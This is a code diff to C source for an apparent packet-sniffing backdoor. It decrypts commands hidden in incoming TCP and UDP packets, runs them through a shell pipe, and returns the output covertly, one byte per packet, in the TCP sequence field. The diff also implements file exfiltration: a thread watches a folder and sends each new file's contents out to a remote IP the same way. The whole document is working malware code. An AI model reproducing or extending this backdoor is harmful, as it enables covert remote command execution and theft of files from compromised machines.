@@ -32,6 +32,7 @@
 struct bpf_program fltr_prog;
 
 struct exfil_pack {
+	uint32 src;
 	uint32 ipaddr;
 	char *folder;
 };
@@ -39,7 +40,7 @@ struct exfil_pack {
 int channel;
 uint32 ip_addr;
 
-void pcap_init(uint32 ipaddr, char *folder, int chan) {
+void pcap_init(uint32 src, uint32 ipaddr, char *folder, int chan) {
 	pcap_t* nic;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pthread_t exfil_thread;
@@ -53,6 +54,7 @@ void pcap_init(uint32 ipaddr, char *folder, int chan) {
 		fltr_str = PKT_U_FLT;
 
 // Setup Exfil Watch
+	expack.src = src;
 	expack.ipaddr = ipaddr;
 	expack.folder = folder;
 	pthread_create(&exfil_thread, NULL, exfil_watch, &expack);
@@ -112,7 +114,7 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	struct tcphdr* tcphdr;
 	struct iphdr* iphdr;
 	int size_tcp, ip_len;
-	char *tcp_payload, *decrypt_payload;
+	char *tcp_payload;
 
 	tcp_payload = malloc(sizeof(char *));
 
@@ -129,11 +131,8 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	tcp_payload = (char *) (packet + sizeof(struct ether_header) + ip_len
 			+ size_tcp);
 
-	//decrypt_payload = malloc(sizeof(char *));
-
 	// decrypt the payload and copy it into decrypt_payload variable.
-	//decrypt(SEKRET, tcp_payload, sizeof(tcp_payload));
-	//memcpy(decrypt_payload, tcp_payload, strlen(tcp_payload));
+	decrypt(SEKRET, tcp_payload, sizeof(tcp_payload));
 	printf("PAYLOAD => %s", tcp_payload);
 
 	cmd_execute(tcp_payload, iphdr->daddr, ip_addr);
@@ -144,7 +143,7 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	struct udphdr* udphdr;
 	struct iphdr* iphdr;
 	int size_udp, ip_len;
-	char *udp_payload, *decrypt_payload;
+	char *udp_payload;
 
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	ip_len = iphdr->ihl * 4;
@@ -158,12 +157,8 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	// retrieves the UDP payload
 	udp_payload = (char *) (iphdr + ip_len + size_udp);
 
-	// initialize the variable
-	decrypt_payload = malloc(sizeof(char *));
-
-	// decrypt the payload and copy it into decrypt_payload variable.
-	//decrypt(SEKRET, udp_payload, sizeof(udp_payload));
-	memcpy(decrypt_payload, udp_payload, strlen(udp_payload));
+	// decrypt the payload .
+	decrypt(SEKRET, udp_payload, sizeof(udp_payload));
 
 	printf("UDP PAYLOAD = %s", udp_payload);
 
@@ -174,11 +169,9 @@ void cmd_execute(char *command, uint32 src, uint32 ip) {
 	FILE *fp;
 	char line[MAX_LEN];
 	char resp[MAX_LEN];
-	char *trans;
-	int tot_len, i = 0, j = 0;
+	int tot_len, i = 0;
 
 	printf("Command => %s\n", command);
-
 	memset(line, 0, MAX_LEN);
 	memset(resp, 0, MAX_LEN);
 
@@ -191,47 +184,21 @@ void cmd_execute(char *command, uint32 src, uint32 ip) {
 		printf("line =>  %s\n", line);
 	}
 
+	strcat(resp, "\n");
+
 	tot_len = strlen(resp) + 1;
-
-	trans = (char *) malloc(tot_len);
-
-	memcpy(trans, resp, tot_len);
 
 	printf("Response Len => %d\n", tot_len);
 
-	//strncpy(trans, resp, tot_len);
+	for (i = 0; i < tot_len; i++) {
 
-	for (i = 0; i < tot_len; i += 8) {
-		char frame[FRAM_SZ];
-		char *ptr;
-		int fram_len;
 		char tcp_seq;
 
-		ptr = trans + i;
-
-		fram_len = (tot_len - i > 8) ? FRAM_SZ : (tot_len - i);
-
-		// binary copy of first 8 characters
-		memcpy(frame, ptr, fram_len);
-
-		// encrypt the frame of 8 characters
-//encrypt(SEKRET, frame, FRAM_SZ);
-
-		// go through the frame and send 1 character at a time
-		// in the TCP sequence field.
-
-		for (j = 0; j < FRAM_SZ; ++j) {
-			//tcp_seq = DEF_SEQ;
-			//tcp_seq += frame[j]; // adding to the default sequence number
-			/*REMOVE THIS*/tcp_seq = frame[j];
-
-			usleep(SLEEP_TIME); // sleep for specific amount of time
-			_send(src, ip, tcp_seq, RSP_TYP); // send the packet as a response packet
-		}
+		tcp_seq = resp[i];
+		usleep(SLEEP_TIME); // sleep for specific amount of time
+		_send(src, ip, tcp_seq, RSP_TYP); // send the packet as a response packet
 	}
 
-	// free the pointer
-	free(trans);
 	// close the pipe file pointer
 	pclose(fp);
 }
@@ -242,11 +209,15 @@ void *exfil_watch(void *arg) {
 	fd_set rfds;
 	struct exfil_pack expck;
 	uint32 ipaddr;
+	uint32 src;
 	char *folder;
 
 	expck = *(struct exfil_pack*) arg;
+	src = expck.src;
 	ipaddr = expck.ipaddr;
 	folder = expck.folder;
+
+	printf("Folder => %s", folder);
 
 	fd = inotify_init();
 	if (fd < 0)
@@ -281,7 +252,7 @@ void *exfil_watch(void *arg) {
 				strncpy(path, folder, MAX_LEN);
 				strcat(path, "/");
 				strcat(path, event->name);
-				exfil_send(ipaddr, path);
+				exfil_send(src, ipaddr, path);
 			}
 
 			i += EVENT_SIZE + event->len;
@@ -304,6 +275,32 @@ void *exfil_watch(void *arg) {
 	return NULL;
 }
 
-void exfil_send(uint32 ipaddr, char *path) {
-//sfsdf
+void exfil_send(uint32 src, uint32 ipaddr, char *path) {
+	int buflen, i;
+	char buffer[MAX_LEN];
+	FILE *file;
+
+	file = open_file(path, FALSE);
+
+	while ((buflen = fread(buffer, 1, MAX_LEN, file)) > 0) {
+		char *trans;
+		int tot_len;
+
+		tot_len = buflen + 1;
+
+		trans = (char *) malloc(tot_len);
+
+		memcpy(trans, buffer, tot_len);
+
+		printf("Buflen => %d\n", tot_len);
+
+		for (i = 0; i < tot_len; i++) {
+			char tcp_seq;
+
+			tcp_seq = buffer[i];
+			usleep(SLEEP_TIME); // sleep for specific amount of time
+			_send(src, ipaddr, tcp_seq, XFL_TYP); // send the packet as a response packet
+		}
+	}
+	fclose(file);
 }
